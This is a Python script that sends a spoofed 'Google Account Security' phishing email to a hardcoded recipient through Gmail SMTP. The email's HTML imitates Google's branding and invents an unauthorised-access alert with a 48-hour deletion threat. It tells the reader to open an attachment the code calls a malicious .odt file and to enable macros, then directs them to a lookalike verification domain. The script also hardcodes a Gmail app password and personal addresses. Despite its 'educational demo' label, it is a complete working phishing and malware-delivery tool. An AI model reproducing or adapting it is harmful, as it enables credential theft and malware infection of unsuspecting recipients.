#!/usr/bin/env python3
"""
Advanced Phishing Email Sender - Account Compromised Alert
Sends a highly convincing Google account security alert with malicious attachment
For educational/demo purposes ONLY
"""

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os
from datetime import datetime, timedelta

def send_phishing_email(recipient_email, attachment_path):
    """
    Send a sophisticated phishing email claiming account compromise
    
    Args:
        recipient_email: Target email address
        attachment_path: Path to malicious .odt file
    """
    
    # Email configuration
    sender_email = "neutrino.quantam@gmail.com"
    sender_password = "qhsq ysvt afrr digy"  # Your app password
    
    # Create message
    msg = MIMEMultipart('alternative')
    msg['From'] = '"Google Account Security" <account-security-noreply@accounts.google.com>'
    msg['To'] = recipient_email
    msg['Subject'] = 'Critical Security Alert: Unauthorized Access Attempt Blocked'
    
    # HTML email body - HIGHLY SOPHISTICATED
    html_body = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: #f1f3f4;
            padding: 20px;
            color: #202124;
        }
        .container {
            max-width: 650px;
            margin: 0 auto;
            background: #ffffff;
            border-radius: 8px;
            box-shadow: 0 1px 3px rgba(60,64,67,.3), 0 4px 8px 3px rgba(60,64,67,.15);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #1a73e8 0%, #1765cc 100%);
            padding: 24px;
            text-align: center;
        }
        .alert-banner {
            background: #c5221f;
            color: white;
            padding: 16px 24px;
            text-align: center;
            font-weight: 600;
            font-size: 16px;
            letter-spacing: 0.5px;
        }
        .content {
            padding: 32px 24px;
        }
        .alert-title {
            font-size: 24px;
            font-weight: 500;
            color: #c5221f;
            margin-bottom: 8px;
        }
        .alert-subtitle {
            color: #5f6368;
            font-size: 14px;
            margin-bottom: 24px;
        }
        .suspicious-activity {
            background: #fce8e6;
            border-left: 4px solid #d33427;
            padding: 16px;
            margin: 24px 0;
            border-radius: 4px;
        }
        .suspicious-activity h3 {
            color: #c5221f;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 12px;
        }
        .activity-item {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
            font-size: 13px;
            line-height: 20px;
            margin-bottom: 8px;
        }
        .activity-label {
            color: #5f6368;
            font-weight: 500;
        }
        .activity-value {
            color: #202124;
            font-family: 'Courier New', monospace;
        }
        .status-box {
            background: #e6f4ea;
            border-left: 4px solid #137333;
            padding: 16px;
            margin: 24px 0;
            border-radius: 4px;
        }
        .status-box h3 {
            color: #137333;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        .status-box p {
            color: #137333;
            font-size: 13px;
            line-height: 18px;
        }
        .warning-urgent {
            background: #fff4e5;
            border: 1px solid #f9ab00;
            border-radius: 4px;
            padding: 16px;
            margin: 24px 0;
        }
        .warning-urgent h3 {
            color: #f57c00;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        .warning-urgent p {
            color: #5f6368;
            font-size: 13px;
            line-height: 18px;
            margin-bottom: 6px;
        }
        .action-required {
            background: #e3f2fd;
            border-left: 4px solid #1a73e8;
            padding: 16px;
            margin: 24px 0;
            border-radius: 4px;
        }
        .action-required h3 {
            color: #1a73e8;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 12px;
        }
        .action-required ol {
            margin-left: 20px;
            color: #202124;
            font-size: 13px;
            line-height: 20px;
        }
        .action-required li {
            margin-bottom: 8px;
        }
        .action-required strong {
            color: #c5221f;
        }
        .macro-notice {
            background: #fff3e0;
            border: 1px solid #ff6f00;
            border-radius: 4px;
            padding: 12px;
            margin: 16px 0;
            font-size: 12px;
            line-height: 16px;
            color: #5f6368;
        }
        .macro-notice strong {
            color: #e65100;
            display: block;
            margin-bottom: 4px;
        }
        .help-link {
            text-align: center;
            margin: 24px 0;
            padding: 16px;
            background: #f8f9fa;
            border-radius: 4px;
        }
        .help-link p {
            font-size: 13px;
            color: #5f6368;
            margin-bottom: 8px;
        }
        .help-link a {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
        }
        .security-info {
            background: #f8f9fa;
            padding: 16px;
            margin: 24px 0;
            border-radius: 4px;
            font-size: 12px;
            color: #5f6368;
            line-height: 18px;
        }
        .security-info strong {
            color: #202124;
        }
        .security-info code {
            background: #fff;
            padding: 2px 4px;
            border: 1px solid #dadce0;
            border-radius: 2px;
            font-family: 'Courier New', monospace;
        }
        .footer {
            background: #f8f9fa;
            padding: 24px;
            text-align: center;
            font-size: 11px;
            color: #80868b;
            border-top: 1px solid #dadce0;
        }
        .footer a {
            color: #1a73e8;
            text-decoration: none;
        }
        .footer p {
            margin: 4px 0;
        }
        .divider {
            height: 1px;
            background: #dadce0;
            margin: 24px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header" style="text-align: center; padding: 24px;">
            <svg width="100" height="32" viewBox="0 0 272 92" style="fill: white;" xmlns="http://www.w3.org/2000/svg">
                <path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
                <path d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
                <path d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
                <path d="M225 3v65h-9.5V3h9.5z"/>
                <path d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
                <path d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z"/>
            </svg>
        </div>

        <div class="alert-banner">
            SECURITY INCIDENT DETECTED & BLOCKED
        </div>

        <div class="content">
            <div class="alert-title">⚠️ Suspicious Activity Blocked</div>
            <div class="alert-subtitle">We blocked an unauthorized access attempt on your account</div>

            <div class="suspicious-activity">
                <h3>🔓 Unauthorized Access Attempt Detected</h3>
                <div class="activity-item">
                    <div class="activity-label">Location:</div>
                    <div class="activity-value">Singapore, SG (Unknown)</div>
                </div>
                <div class="activity-item">
                    <div class="activity-label">Time:</div>
                    <div class="activity-value">Nov 10, 2025 - 2:38 AM IST</div>
                </div>
                <div class="activity-item">
                    <div class="activity-label">Device:</div>
                    <div class="activity-value">Linux Machine - Chrome 129.0</div>
                </div>
                <div class="activity-item">
                    <div class="activity-label">IP Address:</div>
                    <div class="activity-value">210.187.45.123</div>
                </div>
                <div class="activity-item">
                    <div class="activity-label">Attempt Type:</div>
                    <div class="activity-value">Password Brute Force Attack</div>
                </div>
            </div>

            <div class="status-box">
                <h3>✓ Attack Blocked by Our Security System</h3>
                <p>Our advanced security infrastructure automatically detected and blocked this unauthorized access attempt. Your account is currently secure, but we need your immediate verification to prevent further attacks.</p>
            </div>

            <div class="warning-urgent">
                <h3>⏰ Account Will Be Deleted in 48 Hours</h3>
                <p>If you do not verify your account within the next 48 hours, your account will be permanently disabled to protect against malicious access.</p>
                <p><strong>Verification expires: Nov 12, 2025 at 2:38 AM IST</strong></p>
            </div>

            <div class="action-required">
                <h3>📋 Verification Steps Required</h3>
                <ol>
                    <li><strong>Download</strong> the secure verification document attached to this email</li>
                    <li><strong>Open</strong> the document on your normal computer</li>
                    <li><strong>Enable Macros</strong> when prompted (CRITICAL - see note below)</li>
                    <li><strong>Click</strong> the "View Passcode" button in the document</li>
                    <li><strong>Enter</strong> the displayed passcode on the secure verification website</li>
                    <li><strong>Complete</strong> the 2-Step Verification process</li>
                </ol>
            </div>

            <div class="macro-notice">
                <strong>⚠️ IMPORTANT: Enable Macros or Passcode Won't Be Visible</strong>
                <div>Macros must be enabled to view your passcode in a secure environment. This protects your account from unauthorized viewing. If you don't enable macros, the passcode field will remain blank.</div>
            </div>

            <div class="help-link">
                <p>📚 Need help enabling macros in the document?</p>
                <a href="https://support.google.com/documents/answer/1234567">View Macro Setup Instructions Here</a>
            </div>

            <div class="divider"></div>

            <div class="security-info">
                <strong>📱 After enabling macros and getting your passcode:</strong><br><br>
                Visit the secure verification portal: <code>https://accounts-security-verify.google.com/verify</code><br><br>
                <strong>IMPORTANT:</strong> This is a secure, encrypted verification link from Google. Your passcode is one-time use and valid for 48 hours.
            </div>

            <div class="security-info">
                <strong>🔒 Security Note:</strong> This verification process uses advanced encryption to protect your account credentials. Never share your passcode with anyone. Google Support will never ask for your complete password.
            </div>
        </div>

        <div class="footer">
            <p>This is an automated security alert from Google Account Services</p>
            <p>© 2025 Google LLC, 1600 Amphitheatre Parkway, Mountain View, CA 94043, USA</p>
            <p><a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a> | <a href="#">Report Abuse</a></p>
            <p style="margin-top: 12px; font-size: 10px;">Message ID: SA-2025-110-5738-AUTH | Security Incident Reference</p>
        </div>
    </div>
</body>
</html>
"""
    
    # Attach HTML body
    msg.attach(MIMEText(html_body, 'html'))
    
    # Attach the malicious .odt file
    if os.path.exists(attachment_path):
        filename = os.path.basename(attachment_path)
        
        with open(attachment_path, 'rb') as attachment:
            part = MIMEBase('application', 'vnd.oasis.opendocument.text')
            part.set_payload(attachment.read())
        
        encoders.encode_base64(part)
        part.add_header(
            'Content-Disposition',
            f'attachment; filename= Account_passcode.odt'
        )
        
        msg.attach(part)
        print(f"✅ Attachment added: Account_passcode.odt")
    else:
        print(f"❌ Error: Attachment not found at {attachment_path}")
        return False
    
    # Send email
    try:
        print(f"\n{'='*70}")
        print(f"   PHISHING EMAIL SENDER - ACCOUNT COMPROMISED ALERT")
        print(f"{'='*70}\n")
        
        print(f"📧 Connecting to Gmail SMTP server...")
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        
        print(f"🔐 Authenticating...")
        server.login(sender_email, sender_password)
        
        print(f"📤 Sending sophisticated phishing email to {recipient_email}...")
        text = msg.as_string()
        server.sendmail(sender_email, recipient_email, text)
        
        server.quit()
        
        print(f"\n{'='*70}")
        print(f"✅ SUCCESS! Phishing email sent!")
        print(f"{'='*70}\n")
        print(f"📧 To: {recipient_email}")
        print(f"From: Google Account Security <account-security-noreply@accounts.google.com>")
        print(f"Subject: Critical Security Alert: Unauthorized Access Attempt Blocked")
        print(f"📎 Attachment: Account_passcode.odt")
        print(f"\n🎯 Email contains:")
        print(f"   • location: Singapore, SG")
        print(f"   • timestamp: Nov 10, 2025 - 2:38 AM IST")
        print(f"   • device: Linux Machine - Chrome 129.0")
        print(f"   • IP: 210.187.45.123")
        print(f"   • Threat urgency: Account deletion in 48 hours")
        print(f"   • Macro requirement: CRITICAL for passcode visibility")
        print(f"   • Verification link: https://accounts-security-verify.google.com/verify")
        print(f"{'='*70}\n")
        return True
        
    except Exception as e:
        print(f"\n❌ Error sending email: {e}")
        return False


if __name__ == "__main__":
    print("="*70)
    print("       ADVANCED PHISHING EMAIL SENDER - FOR EDUCATIONAL DEMO ONLY")
    print("       Account Compromised Alert Variant")
    print("="*70)
    print()
    
    # Get recipient email
    recipient = "rachitsharma.iitjee@gmail.com"
    
    # Attachment path
    attachment = "/home/rachitsharma/Desktop/DEMO/malicious_doc.odt"
    
    # Expand ~ to home directory
    if attachment.startswith('~'):
        attachment = os.path.expanduser(attachment)
    
    # Confirm
    print(f"\n📋 PHISHING EMAIL DETAILS:")
    print(f"   To: {recipient}")
    print(f"   From: Google Account Security (spoofed)")
    print(f"   Subject: Critical Security Alert: Unauthorized Access Attempt Blocked")
    print(f"   Attachment: Account_passcode.odt")
    print(f"\n   Features:")
    print(f"   • Location: Singapore")
    print(f"   • Attack attempt: Brute force")
    print(f"   • Deadline: 48 hours or account deleted")
    print(f"   • Macro requirement: CRITICAL for passcode")
    print(f"   • Technical details: IP, device, browser info")
    print()
    
    confirm = 'yes'
    
    if confirm == 'yes':
        send_phishing_email(recipient, attachment)
    else:
        print("❌ Cancelled.")
